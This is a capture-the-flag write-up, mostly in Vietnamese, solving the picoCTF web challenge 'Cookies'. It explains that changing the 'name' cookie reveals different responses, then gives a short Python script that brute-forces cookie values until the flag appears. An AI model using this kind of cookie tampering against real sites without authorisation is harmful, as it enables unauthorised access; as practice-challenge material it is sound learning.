Cookies
===
**Category**: Web

**Author**: MADSTACKS

### Description
Who doesn't love cookies? Try to figure out the best one.

### Overview
- Đầu tiên truy cập vào website thì chúng ta thấy được có một ô để chúng ta input vào chương trình và đại loại như là tìm kiếm cookie mà nó được lưu trong server. Mình thử nhập một vài kí tự bất kì để tìm kiếm thì nhận được thông báo `That doesn't appear to be a valid cookie.`
- Kiểm tra cookie bằng edit this cookie thì thấy có một cookie có tên là `name` và value của nó là `-1`. Mình thử thay đổi nó thành `1` thì nhận được thông báo `I love chocolate chip cookies!`

### Solution
- Ý tưởng là thay đổi value của cookie `name`  đến khi nào có flag vì vậy mình đã viết một script để làm việc này. (Brute value của name)

##### Payload
```py
import requests

url = 'URL:PORT/check'

for i in range(17,100):
    print(i)
    cookies = {'name':f'{i}'}
    print(cookies)
    r = requests.get(url = url, cookies = cookies)
    if 'picoCTF' in r.text:
        print(r.text)
        exit()
```